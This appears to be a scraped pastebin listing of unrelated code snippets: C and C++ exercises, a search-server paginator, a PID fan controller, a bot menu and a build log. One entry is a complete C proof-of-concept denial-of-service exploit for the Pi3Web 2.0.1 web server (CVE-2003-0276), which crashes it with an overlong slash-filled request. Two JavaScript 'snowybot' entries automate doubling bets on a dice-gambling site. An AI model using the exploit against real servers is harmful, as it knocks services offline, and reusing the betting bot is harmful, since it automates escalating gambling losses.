        time.sleep(2.0)  # Adjust the sleep interval as needed

    return sum(jitter_values) / len(jitter_values)

def main():
    setpoint_temperature = 40.0  # Setpoint temperature in Celsius
    initial_pid_params = {""kp"": 1.0, ""ki"": 0.1, ""kd"": 0.01}
    
    pid_controller = PIDController(initial_pid_params[""kp""], initial_pid_params[""ki""], initial_pid_params[""kd""], setpoint_temperature)

    tuned_params = tune_pid_parameters(pid_controller, initial_pid_params)
    
    print(""Tuned PID parameters:"", tuned_params)

    # Save tuned PID parameters to a file
    save_pid_parameters(tuned_params)

    while True:
        current_temperature = read_temperature()
        fan_speed = max(0, min(4, math.floor(pid_controller.compute(current_temperature))))

        # Set fan speed by writing to /sys/class/thermal/cooling_device0/cur_state
        fan_speed_path = ""/sys/class/thermal/cooling_device0/cur_state""
        with open(fan_speed_path, ""w"") as file:
            file.write(str(fan_speed))

        time.sleep(2.0)  # Adjust the sleep interval as needed

if __name__ == ""__main__"":
    main()
"
5uBA15ZT,number_triangle_pattern_alternate.c,dmilicev,C,Friday 26th of January 2024 04:35:04 AM CDT,"/*

    number_triangle_pattern_alternate.c

https://www.facebook.com/groups/3092811364081112/permalink/7605244639504406/

Solution from Dan Mathew Gamale :
https://www.facebook.com/groups/3092811364081112/user/100005184546962/

numbers           indexes           matrix

1                 00                00 01 02 03 04
2 9               10 11             10 11 12 13 14
3 8 10            20 21 22          20 21 22 23 24
4 7 11 14         30 31 32 33       30 31 32 33 34
5 6 12 13 15      40 41 42 43 44    40 41 42 43 44


    You can find all my C programs at Dragan Milicev's pastebin:

    https://pastebin.com/u/dmilicev

*/

#include<stdio.h>
#include <string.h>                 // for memset()

// print triangle of numbers
void number_triangle_pattern_from_top(int n){
    int r,c, num=1;                 // r - row, c - column, num - number
    int arr[n][n];                  // n - number of rows and columns

    // memset() is used to fill a block of memory with a particular value.
    memset(arr,0,sizeof(arr));      // set all elements to 0

/*
    for(r=0; r<n; r++)              // set all elements to 0, another way
        for(c=0; c<n; c++)
            arr[r][c]=0;
*/
    // set all elements to num
    for(c=0; c<n; c++)              // column
        for (r=0; r<n-c; r++)       // row
            if (c%2)                // odd column
                arr[n-r-1][c] = num++;
            else
                arr[r+c][c] = num++;

    // print triangle
    for(r=0; r<n; r++) {            // row
        for(c=0; c<n; c++)          // column
            if (arr[r][c] != 0)
                printf(""%3d"",arr[r][c]);
        printf(""\n"");
    }

    printf(""\n"");
}


int main(void){
    int n;                          // n - number of rows and columns

    for(n=3; n<=6; n++){            // a few examples
        printf(""\n  n = %d \n\n"",n);
        number_triangle_pattern_from_top(n);
    }

    return 0;
} // main()
"
5iS1XJcQ,Untitled,Josif_tepe,C++,Friday 26th of January 2024 04:32:35 AM CDT,"#include <iostream>
using namespace std;
int main() {
    int k;
    cin >> k;
    
    int broj = 1;
    int zbir = 0;
    for(int i = 1; i <= k; i += 1) {
        zbir += broj;
        broj += 3;
    }
    cout << zbir << endl;
    return 0;
}
"
7L5KBRy1,Выводим результат поиска страницами,prizrak567890,C++,Friday 26th of January 2024 04:30:56 AM CDT,"#include <algorithm>
#include <cmath>
#include <iostream>
#include <map>
#include <set>
#include <stdexcept>
#include <string>
#include <utility>
#include <vector>

using namespace std;

const int MAX_RESULT_DOCUMENT_COUNT = 5;

// Функция для чтения строки с консоли
string ReadLine() {
    string s;
    getline(cin, s);
    return s;
}

// Функция для чтения числа из строки
int ReadLineWithNumber() {
    int result;
    cin >> result;
    ReadLine();
    return result;
}

// Функция для разделения текста на слова
vector<string> SplitIntoWords(const string& text) {
    vector<string> words;
    string word;
    for (const char c : text) {
        if (c == ' ') {
            if (!word.empty()) {
                words.push_back(word);
                word.clear();
            }
        }
        else {
            word += c;
        }
    }
    if (!word.empty()) {
        words.push_back(word);
    }

    return words;
}

// Структура для представления документа
struct Document {
    Document() = default;

    Document(int id, double relevance, int rating)
        : id(id)
        , relevance(relevance)
        , rating(rating) {
    }

    int id = 0;
    double relevance = 0.0;
    int rating = 0;
};

// Шаблонная функция для создания уникального множества непустых строк
template <typename StringContainer>
set<string> MakeUniqueNonEmptyStrings(const StringContainer& strings) {
    set<string> non_empty_strings;
    for (const string& str : strings) {
        if (!str.empty()) {
            non_empty_strings.insert(str);
        }
    }
    return non_empty_strings;
}

// Перечисление статусов документа
enum class DocumentStatus {
    ACTUAL,
    IRRELEVANT,
    BANNED,
    REMOVED,
};

// Класс для поиска документов
class SearchServer {
public:
    // Конструктор, принимающий контейнер стоп-слов
    template <typename StringContainer>
    explicit SearchServer(const StringContainer& stop_words)
        : stop_words_(MakeUniqueNonEmptyStrings(stop_words))  // Извлекаем непустые стоп-слова
    {
        if (!all_of(stop_words_.begin(), stop_words_.end(), IsValidWord)) {
            throw invalid_argument(""Some of stop words are invalid""s);
        }
    }

    // Конструктор, принимающий текст стоп-слов
    explicit SearchServer(const string& stop_words_text)
        : SearchServer(
            SplitIntoWords(stop_words_text))  // Вызываем делегирующий конструктор с контейнером строк
    {
    }

    // Метод для добавления документа
    void AddDocument(int document_id, const string& document, DocumentStatus status,
        const vector<int>& ratings) {
        if ((document_id < 0) || (documents_.count(document_id) > 0)) {
            throw invalid_argument(""Invalid document_id""s);
        }
        const auto words = SplitIntoWordsNoStop(document);

        const double inv_word_count = 1.0 / words.size();
        for (const string& word : words) {
            word_to_document_freqs_[word][document_id] += inv_word_count;
        }
        documents_.emplace(document_id, DocumentData{ ComputeAverageRating(ratings), status });
        document_ids_.push_back(document_id);
    }

    // Шаблонный метод для поиска документов по запросу
    template <typename DocumentPredicate>
    vector<Document> FindTopDocuments(const string& raw_query,
        DocumentPredicate document_predicate) const {
        const auto query = ParseQuery(raw_query);

        auto matched_documents = FindAllDocuments(query, document_predicate);

        // Сортируем документы по релевантности и рейтингу
        sort(matched_documents.begin(), matched_documents.end(),
            [](const Document& lhs, const Document& rhs) {
                if (abs(lhs.relevance - rhs.relevance) < 1e-6) {
                    return lhs.rating > rhs.rating;
                }
                else {
                    return lhs.relevance > rhs.relevance;
                }
            });
        if (matched_documents.size() > MAX_RESULT_DOCUMENT_COUNT) {
            matched_documents.resize(MAX_RESULT_DOCUMENT_COUNT);
        }

        return matched_documents;
    }

    // Метод для поиска документов по запросу и статусу
    vector<Document> FindTopDocuments(const string& raw_query, DocumentStatus status) const {
        return FindTopDocuments(
            raw_query, [status](int document_id, DocumentStatus document_status, int rating) {
                return document_status == status;
            });
    }

    // Метод для поиска документов по запросу с учетом статуса ACTUAL
    vector<Document> FindTopDocuments(const string& raw_query) const {
        return FindTopDocuments(raw_query, DocumentStatus::ACTUAL);
    }

    // Метод для получения общего количества документов
    int GetDocumentCount() const {
        return documents_.size();
    }

    // Метод для получения идентификатора документа по индексу
    int GetDocumentId(int index) const {
        return document_ids_.at(index);
    }

    // Метод для поиска совпадений слов в запросе для указанного документа
    tuple<vector<string>, DocumentStatus> MatchDocument(const string& raw_query,
        int document_id) const {
        const auto query = ParseQuery(raw_query);

        vector<string> matched_words;
        for (const string& word : query.plus_words) {
            if (word_to_document_freqs_.count(word) == 0) {
                continue;
            }
            if (word_to_document_freqs_.at(word).count(document_id)) {
                matched_words.push_back(word);
            }
        }
        for (const string& word : query.minus_words) {
            if (word_to_document_freqs_.count(word) == 0) {
                continue;
            }
            if (word_to_document_freqs_.at(word).count(document_id)) {
                matched_words.clear();
                break;
            }
        }
        return { matched_words, documents_.at(document_id).status };
    }

private:
    // Структура данных для хранения информации о документе
    struct DocumentData {
        int rating;
        DocumentStatus status;
    };
    const set<string> stop_words_;
    map<string, map<int, double>> word_to_document_freqs_;
    map<int, DocumentData> documents_;
    vector<int> document_ids_;

    // Метод для проверки, является ли слово стоп-словом
    bool IsStopWord(const string& word) const {
        return stop_words_.count(word) > 0;
    }

    // Проверка, является ли слово допустимым (не содержит спецсимволов)
    static bool IsValidWord(const string& word) {
        // A valid word must not contain special characters
        return none_of(word.begin(), word.end(), [](char c) {
            return c >= '\0' && c < ' ';
            });
    }

    // Разделение текста на слова, исключая стоп-слова и проверяя их допустимость
    vector<string> SplitIntoWordsNoStop(const string& text) const {
        vector<string> words;
        for (const string& word : SplitIntoWords(text)) {
            if (!IsValidWord(word)) {
                throw invalid_argument(""Word ""s + word + "" is invalid""s);
            }
            if (!IsStopWord(word)) {
                words.push_back(word);
            }
        }
        return words;
    }

    // Вычисление среднего рейтинга по вектору рейтингов
    static int ComputeAverageRating(const vector<int>& ratings) {
        if (ratings.empty()) {
            return 0;
        }
        int rating_sum = 0;
        for (const int rating : ratings) {
            rating_sum += rating;
        }
        return rating_sum / static_cast<int>(ratings.size());
    }

    // Структура для представления слова из запроса
    struct QueryWord {
        string data;
        bool is_minus;
        bool is_stop;
    };

    // Анализ слова из запроса
    QueryWord ParseQueryWord(const string& text) const {
        if (text.empty()) {
            throw invalid_argument(""Query word is empty""s);
        }
        string word = text;
        bool is_minus = false;
        if (word[0] == '-') {
            is_minus = true;
            word = word.substr(1);
        }
        if (word.empty() || word[0] == '-' || !IsValidWord(word)) {
            throw invalid_argument(""Query word ""s + text + "" is invalid"");
        }

        return { word, is_minus, IsStopWord(word) };
    }

    // Структура для представления запроса
    struct Query {
        set<string> plus_words;
        set<string> minus_words;
    };
    // Анализ запроса
    Query ParseQuery(const string& text) const {
        Query result;
        for (const string& word : SplitIntoWords(text)) {
            const auto query_word = ParseQueryWord(word);
            if (!query_word.is_stop) {
                if (query_word.is_minus) {
                    result.minus_words.insert(query_word.data);
                }
                else {
                    result.plus_words.insert(query_word.data);
                }
            }
        }
        return result;
    }

    // Вычисление обратной частоты документов для слова
    double ComputeWordInverseDocumentFreq(const string& word) const {
        return log(GetDocumentCount() * 1.0 / word_to_document_freqs_.at(word).size());
    }

    // Поиск всех документов, соответствующих запросу с учетом предиката
    template <typename DocumentPredicate>
    vector<Document> FindAllDocuments(const Query& query,
        DocumentPredicate document_predicate) const {
        map<int, double> document_to_relevance;
        for (const string& word : query.plus_words) {
            if (word_to_document_freqs_.count(word) == 0) {
                continue;
            }
            const double inverse_document_freq = ComputeWordInverseDocumentFreq(word);
            for (const auto& [document_id, term_freq] : word_to_document_freqs_.at(word)) {
                const auto& document_data = documents_.at(document_id);
                if (document_predicate(document_id, document_data.status, document_data.rating)) {
                    document_to_relevance[document_id] += term_freq * inverse_document_freq;
                }
            }
        }

        for (const string& word : query.minus_words) {
            if (word_to_document_freqs_.count(word) == 0) {
                continue;
            }
            for (const auto& [document_id, _] : word_to_document_freqs_.at(word)) {
                document_to_relevance.erase(document_id);
            }
        }

        vector<Document> matched_documents;
        for (const auto& [document_id, relevance] : document_to_relevance) {
            matched_documents.push_back(
                { document_id, relevance, documents_.at(document_id).rating });
        }
        return matched_documents;
    }
};

template <typename Iterator>
class Paginator {
public:
    Paginator(Iterator begin, Iterator end, size_t page_size) : begin_(begin), end_(end), page_size_(page_size) {
        size_p = distance(begin, end);
        if (size_p % page_size != 0) {
            size_p = size_p / page_size;
            size_p += 1;
        }
        else {
            size_p = size_p / page_size;
        }
        //docsort_.resize(distance(begin, end));
        docsort_.resize(size_p);
        while (begin != end) {

            alldoc_.push_back(*begin);
            ++begin;

        }


    }

    auto sortc2() {
        int x = 0;
        int lists = 0;
        int convert_pageS = static_cast<int>(page_size_);
        for (int i = 0; i < alldoc_.size(); i++) {
            if (x < convert_pageS) {
                docsort_[lists].insert(docsort_[lists].begin() + x, alldoc_[i]);
                ++x;
            }
            if (x == convert_pageS) {
                x = 0;
                lists += 1;
            }
        }
        return docsort_;
    }


    void ShowMeSort() {
        int x = 0;
        for (int i = 0; i < alldoc_.size(); i++) {
            if (x < page_size_) {
                cout << ""{ document_id = "" << alldoc_[i].id << "", relevance = "" << alldoc_[i].relevance << "", rating = "" << alldoc_[i].relevance << "" }"";
                ++x;
            }
            if (x == page_size_) {
                cout << endl;
                x = 0;
            }
        }
    }

    auto GetAllDoc() {
        return alldoc_;
    }



private:
    int size_p = 0;
    Document last;
    vector<Document> alldoc_;
    vector<vector<Document>> docsort_;
    Iterator begin_, end_;
    size_t page_size_ = 0, page_count_ = 0;
};

template <typename Container>
auto Paginate(const Container& c, size_t page_size) {
    Paginator ret = Paginator(c.begin(), c.end(), page_size);
    //ret.ShowMeSort();
    return ret.sortc2();
}

ostream& operator << (ostream& os, const vector<Document> &obj) {

        os << ""{ document_id = "" << obj[0].id << "", relevance = "" << obj[0].relevance << "", rating = "" << obj[0].rating << "" }"";
        if (obj.size() > 1) {
            os << ""{ document_id = "" << obj[1].id << "", relevance = "" << obj[1].relevance << "", rating = "" << obj[1].rating << "" }"";
        }
    
    return os;
}


int main() {
    SearchServer search_server(""and with""s);
    search_server.AddDocument(1, ""funny pet and nasty rat""s, DocumentStatus::ACTUAL, { 7, 2, 7 });
    search_server.AddDocument(2, ""funny pet with curly hair""s, DocumentStatus::ACTUAL, { 1, 2, 3 });
    search_server.AddDocument(3, ""big cat nasty hair""s, DocumentStatus::ACTUAL, { 1, 2, 8 });
    search_server.AddDocument(4, ""big dog cat Vladislav""s, DocumentStatus::ACTUAL, { 1, 3, 2 });
    search_server.AddDocument(5, ""big dog hamster Borya""s, DocumentStatus::ACTUAL, { 1, 1, 1 });
    const auto search_results = search_server.FindTopDocuments(""curly dog""s);
    int page_size = 2;
    const auto pages = Paginate(search_results, page_size);
    // Выводим найденные документы по страницам
    for (auto page = pages.begin(); page != pages.end(); ++page) {
        cout << *page << endl;
        cout << ""Page break""s << endl;
    }
}"
5Z9EmuFj,number_triangle_pattern_from_top_v1.c,dmilicev,C,Friday 26th of January 2024 04:26:02 AM CDT,"/*

    number_triangle_pattern_from_top_v1.c

https://www.facebook.com/groups/3092811364081112/permalink/7605244639504406/

Solution from Dan Mathew Gamale :
https://www.facebook.com/groups/3092811364081112/user/100005184546962/

numbers           indexes           matrix

1                 00                00 01 02 03 04
2 6               10 11             10 11 12 13 14
3 7 10            20 21 22          20 21 22 23 24
4 8 11 13         30 31 32 33       30 31 32 33 34
5 9 12 14 15      40 41 42 43 44    40 41 42 43 44


    You can find all my C programs at Dragan Milicev's pastebin:

    https://pastebin.com/u/dmilicev

*/

#include<stdio.h>
#include <string.h>                 // for memset()

// print triangle of numbers
void number_triangle_pattern_from_top(int n){
    int r,c, num=1;                 // r - row, c - column, num - number
    int arr[n][n];                  // n - number of rows and columns

    // memset() is used to fill a block of memory with a particular value.
    memset(arr,0,sizeof(arr));      // set all elements to 0

/*
    for(r=0; r<n; r++)              // set all elements to 0, another way
        for(c=0; c<n; c++)
            arr[r][c]=0;
*/
    // set all elements to num
    for(c=0; c<n; c++)              // column
        for (r=0; r<n-c; r++)       // row
            arr[r+c][c] = num++;

    // print triangle
    for(r=0; r<n; r++) {            // row
        for(c=0; c<n; c++)          // column
            if (arr[r][c] != 0)
                printf(""%3d"",arr[r][c]);
        printf(""\n"");
    }

    printf(""\n"");
}


int main(void){
    int n;                          // n - number of rows and columns

    for(n=3; n<=6; n++){            // a few examples
        printf(""\n  n = %d \n\n"",n);
        number_triangle_pattern_from_top(n);
    }

    return 0;
} // main()
"
wj663TiK,menu,Firyan05,HTML,Friday 26th of January 2024 04:24:14 AM CDT,"➤ 𝘽𝙊𝙏 𝙈𝙀𝙉𝙐 🤖

➤  /clear - 𝘾𝙖𝙘𝙝𝙚 𝙈𝙚𝙢𝙤𝙧𝙮 𝙋𝙪𝙧𝙜𝙚 🗑️
➤  /ping - 𝙋𝙞𝙣𝙜 𝙎𝙚𝙧𝙫𝙚𝙧 ⚙️
➤  /system - 𝙑𝙞𝙚𝙬 𝙎𝙮𝙨𝙩𝙚𝙢 𝙄𝙣𝙛𝙤𝙧𝙢𝙖𝙩𝙞𝙤𝙣 🖥️
➤  /speedtest - 𝙄𝙣𝙩𝙚𝙧𝙣𝙚𝙩 𝙎𝙥𝙚𝙚𝙙 𝘼𝙣𝙖𝙡𝙮𝙨𝙞𝙨 ⚡
➤  /vnstat - 𝙑𝙣𝙨𝙩𝙖𝙩 𝙈𝙤𝙣𝙞𝙩𝙤𝙧 📊
➤  /shutdown - 𝙎𝙝𝙪𝙩𝙙𝙤𝙬𝙣 𝙎𝙚𝙧𝙫𝙚𝙧 📴
➤  /shutdown - 𝙎𝙝𝙪𝙩𝙙𝙤𝙬𝙣 𝙎𝙚𝙧𝙫𝙚𝙧 📴
➤  /boxstart - 𝙎𝙩𝙖𝙧𝙩 𝙎𝙞𝙣𝙜-𝙗𝙤𝙭 🟢
➤  /boxrestart - 𝙍𝙚𝙨𝙩𝙖𝙧𝙩 𝙎𝙞𝙣𝙜-𝙗𝙤𝙭 🟡
➤  /boxstop - 𝙎𝙩𝙤𝙥 𝙎𝙞𝙣𝙜-𝙗𝙤𝙭 🟡
➤  /restart - 𝙍𝙚𝙨𝙩𝙖𝙧𝙩 𝘽𝙊𝙏 🤖
➤  /stop - 𝙎𝙩𝙤𝙥 𝘽𝙊𝙏 ❌
➤  /reboot - 𝙍𝙚𝙗𝙤𝙤𝙩 𝙎𝙚𝙧𝙫𝙚𝙧 ♻️

🚀 𝘾𝙝𝙤𝙤𝙨𝙚 𝙔𝙤𝙪𝙧 𝘽𝙤𝙩 𝘼𝙙𝙫𝙚𝙣𝙩𝙪𝙧𝙚 🚀"
r2Zr8GBt,Untitled,Josif_tepe,C++,Friday 26th of January 2024 04:21:22 AM CDT,"#include <iostream>
using namespace std;
int main() {
    int n;
    cin >> n;
    
    int proizvod = 1;
    for(int i = 1; i <= n; i += 1) {
        proizvod *= i;
    }
    cout << proizvod << endl;
    return 0;
}
"
JbVNJBD8,Untitled,Josif_tepe,C++,Friday 26th of January 2024 04:03:53 AM CDT,"#include <iostream>
using namespace std;
int main() {
    int n;
    cin >> n;
    
    int zbir = 0;
    for(int i = 1; i <= n; i++) {
        int x;
        cin >> x;
        zbir += x;
    }
    cout << zbir << endl;
    return 0;
}
"
Gt8aixWE,Unique Rows,D_L3,C++,Friday 26th of January 2024 04:02:42 AM CDT,"#include <cmath>
#include <cstdio>
#include <vector>
#include <iostream>
#include <algorithm>
#include <map>

using namespace std;

map<vector<int>, int> rows;

int main() {
    int n, m;
    cin >> n >> m;
    
    for(int i = 0; i < n; i++) {
        vector<int> row(m);
        for(int i = 0; i < m; i++)
            cin >> row[i];
        rows[row]++;
    }
    int counter = 0;
    for(const auto& row : rows){
        if(row.second == 1)
            counter++;
    }
    cout << counter;
}"
exzM0uvq,Untitled,Josif_tepe,C++,Friday 26th of January 2024 03:55:24 AM CDT,"#include <iostream>
using namespace std;
int main() {
    int n;
    cin >> n;
    int zbir = 0;
    for(int i = 1; i <= n; i += 1) {
        zbir += i;
    }
    cout << zbir << endl;
    return 0;
}
"
mx9sUp97,Untitled,Josif_tepe,C++,Friday 26th of January 2024 03:52:10 AM CDT,"#include <iostream>
using namespace std;
int main() {
    int n;
    cin >> n;
    
    int zbir = n * (n + 1) / 2;
    cout << zbir << endl;
    
    return 0;
}
"
R5g3uUQM,Pi3Web 2.0.1 - Denial of Service (PoC) - CVE-2003-0276,FlyFar,C,Friday 26th of January 2024 03:48:28 AM CDT,"/* Pi3Web 2.0.1 DoS - Pr00f of concept.
*
* Vulnerable systems: Pi3Web 2.0.1 (maybe others)
* Vendor: www.johnroy.com/pi3  - http://pi3web.sourceforge.net/
* Patch: no yet.
*
* Info: Pi3Web Server is vulnerable to a denial of Service.
* when a malformed HTTP Request is done the webserver hangs 
* due to an stack overflow. GET /////////..[354]../////////
*
* Found by aT4r@3wdesign.es  04/26/2003
* Compiled with: lcc-win32 v3.3.
*
*/

#pragma comment (lib,""ws2_32"")
#include <stdio.h>
#include <windows.h>
#include <winsock2.h>
#include <string.h>

char evilbuffer[1024],evilrequest[512],ip[15];
short port=80;


int isalive(int OPT)
{
	struct sockaddr_in haxorcitos;
	int fd;

	haxorcitos.sin_port = htons(port);
	haxorcitos.sin_family = AF_INET;
	haxorcitos.sin_addr.s_addr = inet_addr(ip);

	if ((fd = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP))==-1)
	{
		printf("" [-] Unable to Create Socket\n\n"");
		return(0);
	}
	if (connect(fd,( struct sockaddr *)&haxorcitos,sizeof(haxorcitos)) == -1)
	{
		if (OPT==0)
			printf("" [+] Exploit Success. Remote webserver shutdown\n"");
		else
			printf("" [-] Unable to connect\n\n"");
		return(0);
	}
	if (OPT==0)
	{
		printf("" [-] Exploit Failed. System Patched?\n\n"");
	}
	else
	{
		send(fd,evilbuffer, strlen(evilbuffer),0);
		printf("" [+] Data Sent. Now Checking Host\n"");
		closesocket(fd);

	}
return(1);
}


void usage(void)
{
	printf("" [+] Usage: PiDoS.exe HOST [port]\n\n"");	exit(1);
}


void main(int argc,char *argv[])
{
	WSADATA ws;

	if	(WSAStartup( MAKEWORD(1,1), &ws )!=0)
	{
		printf("" [+] WSAStartup() error\n"");
		exit(0);
	}

	printf(""\n . .. ...:Pi3Web Denial of Service (aT4r@3wdesign.es) :... 
..\n\n"");

	if ((argc!=2) && (argc!=3))
		usage();

	strcpy(ip,argv[1]);
	if (argc==3) port=atoi(argv[2]);

	memset(evilrequest,0,512);
	memset(evilbuffer,0,1024);
	memset(evilrequest,'/',354);
	//sprintf(evilbuffer, ""GET %s\r\n"",evilrequest);
	sprintf(evilbuffer,""GET %s HTTP/1.0\r\nUser-Agent: foo\r\nHost: 
%s\r\n\r\n\r\n"",evilrequest,argv[2]);

	if (isalive(1))
		{ sleep(1000); isalive(0);}

}

// milw0rm.com [2003-04-29]"
MKvVfjHq,time for tweaking snowybot,coinwalk,JavaScript,Friday 26th of January 2024 03:16:06 AM CDT,"var oldestbal = parseFloat(document.getElementById('pct_balance').value);
var base = Number((oldestbal/240).toFixed(8));
var bellance = oldestbal;
var dodgey = oldestbal;
var kitty = oldestbal;
var botplus = base;
var trget = oldestbal;
var tens = (base*10);
var sevens = (base*6.9);
var eights = (base*7.9);
var upper = 5.9;
var downer = 1.9;
var fart = ((Math.floor(oldestbal/tens))*tens);
var bob = oldestbal;
var boobed = oldestbal;
var troll = true;


function get(){
dodgey = document.getElementById('pct_balance').value;
if (dodgey>kitty){
bellance = bellance+botplus
kitty = parseFloat(dodgey);
}
if (dodgey<kitty){
bellance = bellance-botplus
kitty = parseFloat(dodgey);
}
var good = ((bellance-oldestbal).toFixed(8));
console.log(""profit"");
console.log(good);
if (bellance>(fart+(botplus*upper))){
    botplus = botplus*2;
    upper = 2.9;
    downer = 2.9;
    fart = parseFloat(bellance);
    bob = parseFloat(bellance);
}
if (bellance<(fart-(botplus*downer))){
    botplus = botplus*2;
    upper = 2.9;
    downer = 2.9;
    fart = parseFloat(bellance);
}
if ((bellance<=(bob-(botplus*1.9)))&&(botplus>=(base*3.9))&&(bellance>=boobed)&&(bellance<(((Math.floor(bellance/tens))*tens)+sevens))){
    botplus = base;
    upper = 5.9;
    downer = 1.9;
    fart = ((Math.floor(bellance/tens))*tens);
    bob = parseFloat(bellance);
    boobed = parseFloat(bellance);
}
if (((botplus*40)>=oldestbal)&&(bellance<(((Math.floor(bellance/tens))*tens)+sevens))){
    botplus = base;
    upper = 5.9;
    downer = 1.9;
    fart = ((Math.floor(bellance/tens))*tens);
    bob = parseFloat(bellance);
    boobed = parseFloat(bellance);
}
if (bellance>=100) {
console.log(""winner winner chicken dinner"");
return;
}
$('#pct_chance').val(49.5);
$('#pct_bet').val(((botplus*1).toFixed(8)));
$('#a_lo').click();
setTimeout(() => get(), 10);
}
get();
"
s8P79aFC,it finally works snowybot,coinwalk,JavaScript,Friday 26th of January 2024 03:14:14 AM CDT,"var oldestbal = parseFloat(document.getElementById('pct_balance').value);
var base = Number((oldestbal/240).toFixed(8));
var bellance = oldestbal;
var dodgey = oldestbal;
var kitty = oldestbal;
var botplus = base;
var trget = oldestbal;
var tens = (base*10);
var sevens = (base*6.9);
var eights = (base*7.9);
var upper = 5.9;
var downer = 1.9;
var fart = ((Math.floor(oldestbal/tens))*tens);
var bob = oldestbal;
var boobed = oldestbal;
var troll = true;


function get(){
dodgey = document.getElementById('pct_balance').value;
if (dodgey>kitty){
bellance = bellance+botplus
kitty = parseFloat(dodgey);
}
if (dodgey<kitty){
bellance = bellance-botplus
kitty = parseFloat(dodgey);
}
var good = ((bellance-oldestbal).toFixed(8));
console.log(""profit"");
console.log(good);
if (bellance>(fart+(botplus*upper))){
    botplus = botplus*2;
    upper = 2.9;
    downer = 2.9;
    fart = parseFloat(bellance);
    bob = parseFloat(bellance);
}
if (bellance<(fart-(botplus*downer))){
    botplus = botplus*2;
    upper = 2.9;
    downer = 2.9;
    fart = parseFloat(bellance);
}
if ((bellance<=(bob-(botplus*1.9)))&&(botplus>=(base*3.9))&&(bellance>=boobed)&&(bellance<(((Math.floor(bellance/tens))*tens)+sevens))){
    botplus = base;
    upper = 5.9;
    downer = 1.9;
    fart = ((Math.floor(bellance/tens))*tens);
    bob = parseFloat(bellance);
    boobed = parseFloat(bellance);
}
if (((botplus*4)>=oldestbal)&&(bellance>=boobed)&&(bellance<(((Math.floor(bellance/tens))*tens)+sevens))){
    botplus = base;
    upper = 5.9;
    downer = 1.9;
    fart = ((Math.floor(bellance/tens))*tens);
    bob = parseFloat(bellance);
    boobed = parseFloat(bellance);
}
if (bellance>=100) {
console.log(""winner winner chicken dinner"");
return;
}
$('#pct_chance').val(49.5);
$('#pct_bet').val(((botplus*1).toFixed(8)));
$('#a_lo').click();
setTimeout(() => get(), 10);
}
get();
"
sEeR57Fv,Център за поддръжка,D_L3,C++,Friday 26th of January 2024 03:02:53 AM CDT,"#include <cmath>
#include <cstdio>
#include <vector>
#include <iostream>
#include <algorithm>
#include <queue>

using namespace std;


int main() {
    int k, t, b, n, a;
    cin >> k >> t >> b >> n;
    queue<int> requests;
    for(int i = 0; i < n; i ++){
        cin >> a;
        requests.push(a);
    }
    priority_queue<int, vector<int>, greater<int>> pq;
    
    vector<int> result;
    int currTime = 0;
    int groupsSorFar = 0;
    while(!pq.empty() || !requests.empty()) {
        if (currTime % t == 0 && !pq.empty()) {
            for (int i = 0; i < k && !pq.empty(); i++) {
                result.push_back(pq.top());
                pq.pop();
            }
            groupsSorFar++;

            if (groupsSorFar == b)
            {
                break;
            }
        }

        if (!requests.empty()) {
            pq.push(requests.front());
            requests.pop();
        }
        currTime++;
    }
    
    for(int i = 0; i < result.size(); i++){
        cout << result[i] << "" "";
    }
}
"
4pyyKetz,Untitled,vpeter,Bash,Friday 26th of January 2024 02:18:50 AM CDT,">>> calling script unpack ""flycast"" <<<
GET      flycast (git)
    DELETE      (/home/data/scratch/sources/flycast/flycast-*/)
    GIT CLONE      flycast
Cloning into '/home/data/scratch/sources/flycast/flycast-07d6ca6c846ec40ff7f78cbf9f669e70afc956d1'...
remote: Enumerating objects: 69899, done.
remote: Counting objects: 100% (2059/2059), done.
remote: Compressing objects: 100% (832/832), done.
remote: Total 69899 (delta 1371), reused 1722 (delta 1214), pack-reused 67840
Receiving objects: 100% (69899/69899), 113.74 MiB | 23.72 MiB/s, done.
Resolving deltas: 100% (47849/47849), done.
HEAD is now at 07d6ca6c8 gl: better test to detect the nouveau driver
    GIT SUBMODULE      flycast
Submodule 'core/deps/SDL' (https://github.com/libsdl-org/SDL.git) registered for path 'core/deps/SDL'
Submodule 'core/deps/Spout' (https://github.com/vkedwardli/Spout2.git) registered for path 'core/deps/Spout'
Submodule 'core/deps/Syphon' (https://github.com/vkedwardli/Syphon-Framework.git) registered for path 'core/deps/Syphon'
Submodule 'core/deps/Vulkan-Headers' (https://github.com/KhronosGroup/Vulkan-Headers.git) registered for path 'core/deps/Vulkan-Headers'
Submodule 'core/deps/VulkanMemoryAllocator' (https://github.com/GPUOpen-LibrariesAndSDKs/VulkanMemoryAllocator.git) registered for path 'core/deps/VulkanMemoryAllocator'
Submodule 'core/deps/breakpad' (https://github.com/flyinghead/mingw-breakpad) registered for path 'core/deps/breakpad'
Submodule 'core/deps/glslang' (https://github.com/KhronosGroup/glslang.git) registered for path 'core/deps/glslang'
Submodule 'core/deps/libchdr' (https://github.com/flyinghead/libchdr.git) registered for path 'core/deps/libchdr'
Submodule 'core/deps/luabridge' (https://github.com/vinniefalco/LuaBridge.git) registered for path 'core/deps/luabridge'
Submodule 'core/deps/oboe' (https://github.com/google/oboe.git) registered for path 'core/deps/oboe'
Cloning into '/home/data/scratch/sources/flycast/flycast-07d6ca6c846ec40ff7f78cbf9f669e70afc956d1/core/deps/SDL'...
Cloning into '/home/data/scratch/sources/flycast/flycast-07d6ca6c846ec40ff7f78cbf9f669e70afc956d1/core/deps/Spout'...
Cloning into '/home/data/scratch/sources/flycast/flycast-07d6ca6c846ec40ff7f78cbf9f669e70afc956d1/core/deps/Syphon'...
Cloning into '/home/data/scratch/sources/flycast/flycast-07d6ca6c846ec40ff7f78cbf9f669e70afc956d1/core/deps/Vulkan-Headers'...
Cloning into '/home/data/scratch/sources/flycast/flycast-07d6ca6c846ec40ff7f78cbf9f669e70afc956d1/core/deps/VulkanMemoryAllocator'...
Cloning into '/home/data/scratch/sources/flycast/flycast-07d6ca6c846ec40ff7f78cbf9f669e70afc956d1/core/deps/breakpad'...
Cloning into '/home/data/scratch/sources/flycast/flycast-07d6ca6c846ec40ff7f78cbf9f669e70afc956d1/core/deps/glslang'...
Cloning into '/home/data/scratch/sources/flycast/flycast-07d6ca6c846ec40ff7f78cbf9f669e70afc956d1/core/deps/libchdr'...
Cloning into '/home/data/scratch/sources/flycast/flycast-07d6ca6c846ec40ff7f78cbf9f669e70afc956d1/core/deps/luabridge'...
Cloning into '/home/data/scratch/sources/flycast/flycast-07d6ca6c846ec40ff7f78cbf9f669e70afc956d1/core/deps/oboe'...
Submodule path 'core/deps/SDL': checked out 'cc016b0046d563287f0aa9f09b958b5e70d43696'
